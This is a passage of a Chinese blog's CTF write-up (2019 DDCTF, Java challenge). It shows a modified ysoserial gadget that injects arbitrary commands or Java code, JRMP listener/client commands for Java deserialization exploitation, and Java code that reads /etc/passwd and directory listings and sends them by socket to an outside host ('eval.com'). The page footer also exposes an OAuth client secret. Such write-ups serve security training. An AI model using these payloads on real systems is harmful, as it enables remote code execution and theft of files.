ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(StubTransletPayload.class));</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(abstTranslet));</span><br><span class="line">        <span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StubTransletPayload.class.getName());</span><br><span class="line">        <span class="comment">// run command in static initializer</span></span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line"><span class="comment">//        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot; +</span></span><br><span class="line"><span class="comment">//            command.replaceAll(&quot;\\\\&quot;,&quot;\\\\\\\\&quot;).replaceAll(&quot;\&quot;&quot;, &quot;\\\&quot;&quot;) +</span></span><br><span class="line"><span class="comment">//            &quot;\&quot;);&quot;;</span></span><br><span class="line">        String cmd=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//如果以code:开头，认为是代码，否则认为是命令</span></span><br><span class="line">        <span class="keyword">if</span>(!command.startsWith(<span class="string">&quot;code:&quot;</span>))&#123;</span><br><span class="line">            cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">            command.replaceAll(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">            <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Java Code Mode:&quot;</span>+command.substring(<span class="number">5</span>));<span class="comment">//使用stderr输出，防止影响payload的输出</span></span><br><span class="line">            cmd = command.substring(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">        clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(abstTranslet.getName());</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// inject class bytes into instance</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;</span><br><span class="line">            classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">        Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时，我们的payload已经可以支持代码执行了。</p>
+<p>在这里，我是直接用本地的题目环境进行调试，尝试打印了aaa,操作如下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改替换&#123;&#123;内容&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启监听端口</span></span><br><span class="line"><span class="comment"># 建议采用ceye的dnslog查看</span></span><br><span class="line"><span class="comment"># 执行时合并为一行，为了好看，我换了下行</span></span><br><span class="line">java -<span class="built_in">cp</span> ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 </span><br><span class="line">	CommonsBeanutils1 <span class="string">&#x27;code:System.out.printld(&quot;aaa&quot;);&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成链接JRMPListener的payload</span></span><br><span class="line"><span class="comment"># ip端口那里填写运行第4行脚本的主机地址端口</span></span><br><span class="line">java -jar ./ysoserial-5am3.jar JRMPClient2 &#123;&#123;10.0.0.1:8099&#125;&#125; | <span class="built_in">base64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时将第10行生成的代码，直接打到远程即可。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后进而写一下获取文件，以及获取目录的代码。此时拿到文件，无法回显。我们可以用Socket来将文件发送到我们的服务器，然后nc监听端口即可。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下代码使用时，记得压缩到一行。</span></span><br><span class="line"><span class="comment">// 获取目录下内容</span></span><br><span class="line">java.io.<span class="type">File</span> <span class="variable">file</span>  <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">java</span>.io.File(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">java.io.File[] fileLists = file.listFiles();</span><br><span class="line">java.net.<span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.Socket(<span class="string">&quot;eval.com&quot;</span>,<span class="number">8768</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fileLists.length; i++) &#123;</span><br><span class="line">  java.io.<span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">  out.write(fileLists[i].getName().getBytes());</span><br><span class="line">  out.write(<span class="string">&quot;\n&quot;</span>.getBytes());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取文件内容</span></span><br><span class="line">java.io.<span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(<span class="string">&quot;/etc/passwd&quot;</span>);</span><br><span class="line">java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">in = <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(file);</span><br><span class="line"><span class="type">int</span> tempbyte;</span><br><span class="line">java.net.<span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.Socket(<span class="string">&quot;eval.com&quot;</span>,<span class="number">8768</span>);</span><br><span class="line"><span class="keyword">while</span> ((tempbyte = in.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">  java.io.<span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">  out.write(tempbyte);</span><br><span class="line">&#125;</span><br><span class="line">in.close();</span><br><span class="line">s.close();</span><br></pre></td></tr></table></figure>
+
+<p>然后操作如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改替换&#123;&#123;内容&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启监听端口</span></span><br><span class="line"><span class="comment"># 建议采用ceye的dnslog查看</span></span><br><span class="line"><span class="comment"># 执行时合并为一行，为了好看，我换了下行</span></span><br><span class="line">java -<span class="built_in">cp</span> ysoserial-5am3.jar ysoserial.exploit.JRMPListener 8099 </span><br><span class="line">	CommonsBeanutils1 <span class="string">&#x27;code:&#123;&#123;javapayload&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成链接JRMPListener的payload</span></span><br><span class="line"><span class="comment"># ip端口那里填写运行第4行脚本的主机地址端口</span></span><br><span class="line">java -jar ./ysoserial-5am3.jar JRMPClient2 &#123;&#123;10.0.0.1:8099&#125;&#125; | <span class="built_in">base64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听端口数据</span></span><br><span class="line">nc -lnvp 2333</span><br><span class="line"></span><br><span class="line"><span class="comment"># 此时将第10行生成的代码，直接打到远程即可。</span></span><br></pre></td></tr></table></figure>
+
+
+<p>p.s. &#x2F;flag是个文件夹</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190419014937-556bf6f8-6202-1.png" alt="20190419155560445133653.png"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2019/04/19/ddctf2019/">2019DDCTF  writeup</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问  的个人博客"></a></p>
+        <p><span>发布时间:</span>2019年04月19日 - 11时04分</p>
+        <p><span>最后更新:</span>2024年12月05日 - 02时39分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/04/19/ddctf2019/" title="2019DDCTF  writeup">https://blog.5am3.com/2019/04/19/ddctf2019/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://blog.5am3.com/2019/04/19/ddctf2019/　　作者: " title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a  href="/2020/02/11/ctf-node1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          近两次比赛遇到的node题目简析
+        
+      </div>
+    </a>
+  
+  
+    <a  href="/2018/11/12/2018HCTF-share/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">2018HCTF-share</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#100pt-%E6%BB%B4"><span class="toc-number">1.</span> <span class="toc-text">[100pt] 滴~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#130pt-%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">[130pt] 签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#130pt-Upload-IMG"><span class="toc-number">3.</span> <span class="toc-text">[130pt] Upload-IMG</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#140pt-homebrew-event-loop"><span class="toc-number">4.</span> <span class="toc-text">[140pt] homebrew event loop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#200pt-%E6%AC%A2%E8%BF%8E%E6%8A%A5%E5%90%8DDDCTF"><span class="toc-number">5.</span> <span class="toc-text">[200pt] 欢迎报名DDCTF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#210pt-%E5%A4%A7%E5%90%89%E5%A4%A7%E5%88%A9%EF%BC%8C%E4%BB%8A%E6%99%9A%E5%90%83%E9%B8%A1"><span class="toc-number">6.</span> <span class="toc-text">[210pt] 大吉大利，今晚吃鸡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#260pt-mysql%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">7.</span> <span class="toc-text">[260pt] mysql弱口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#390pt-%E5%86%8D%E6%9D%A51%E6%9D%AFJava"><span class="toc-number">8.</span> <span class="toc-text">[390pt] 再来1杯Java</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='https://static.5am3.com/js/baidu/share.js?v=111.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <div id="gitments" style="width: 90%; margin: 0 auto;"></div>
+<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+
+<script>
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      owner: '5am3',
+      repo: '5am3.github.io',
+      oauth: {
+        client_id: 'f9b6a0a70c093d4f4f91',
+        client_secret: 'ddda0abc39ed79ab681585813d74b83e5e00256a',
+      },
+    })
+    gitment.render('gitments')
+</script> 
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/2020/02/11/ctf-node1/" title="上一篇: 近两次比赛遇到的node题目简析">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2018/11/12/2018HCTF-share/" title="下一篇: 2018HCTF-share">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/02/11/ctf-node1/">近两次比赛遇到的node题目简析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/19/ddctf2019/">2019DDCTF  writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/12/2018HCTF-share/">2018HCTF-share</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/23/MysqlOnline-writeup/">MysqlOnline writeup 巅峰极客</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/04/GourdScan_V2/">GourdScan V2 配置安全及使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/03/0ctf-final/">2018 0CTF final h4x0rs.date</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/04/web-testing-one/">记一次简单的渗透测试</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/24/ddctf2018/">2018DDCTF  writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/26/qwb-xss-rpo/">强网杯-Share your mind</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/25/anheng-2-xss/">2018安恒杯二月赛-web-应该不是 XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/08/SCodeCTF/">通过docker部署ctf题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/20/2017LCTF-1/">2017LCTF wanna hack him? writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/09/360-interview/">360面试经历及心得</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/31/miac2-writeup/">2017-miac2-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/02/xman-2/">【诺熙】XMAN训练营手记-2-密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/01/xman-1/">XMAN训练营手记-1</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/17/hexo2/">2.初识HEXO-页面配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/17/hexo1/">1.初识HEXO-文档排版</a></li></ul>
+    
+    <script src="https://cdn.bootcdn.net/ajax/libs/require.js/2.1.6/require.min.js"></script>
+    <script src="https://cdn.bootcdn.net/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2024 丶诺熙
+            </div>
+            <div class="footer-right">
+                <p>Power By <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/maochunguang/black-blue" target="_blank">Themme by tommy</a></p>
+            </div>
+        </div>
+        
+            <div class="visit">
+                <script src="https://s22.cnzz.com/z_stat.php?id=1267947142&web_id=1267947142" language="JavaScript"></script>
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+
+    </div>
+    
+<script src="/js/main.js"></script>
+
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 4;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
